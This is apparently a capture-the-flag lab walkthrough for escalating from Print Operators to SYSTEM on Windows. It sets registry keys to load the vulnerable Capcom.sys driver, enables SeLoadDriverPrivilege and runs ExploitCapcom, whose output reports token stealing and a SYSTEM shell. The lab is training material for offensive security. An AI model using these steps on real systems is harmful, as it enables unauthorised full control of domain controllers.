[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.

all the tools are already available in the c:\tools, you can also transfer it from your attack machine and compile it locally.

```
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

type yes.
```

```
PS C:\tools> .\EnableSeLoadDriverPrivilege.exe
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege                         Disabled
SeLoadDriverPrivilege                             Enabled
SeShutdownPrivilege                               Disabled
SeChangeNotifyPrivilege                           Enabled by default
SeIncreaseWorkingSetPrivilege                     Disabled
NTSTATUS: 00000000, WinError: 0


PS C:\tools> .\DriverView.exe /stext drivers.txt
PS C:\tools> cat drivers.txt | Select-String -pattern Capcom

Driver Name       : Capcom.sys
Filename          : C:\Tools\Capcom.sys
```
enable the driver using the payload and load the drivers.

run the exploit capcom it will give you a new cmd with system priv.

```
PS C:\tools\ExploitCapcom> .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000078
[*] Shellcode was placed at 00000181F8190008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program


```

navigate and grab the flag.

```  
c:\Users\Administrator\Desktop>type flag.txt
````
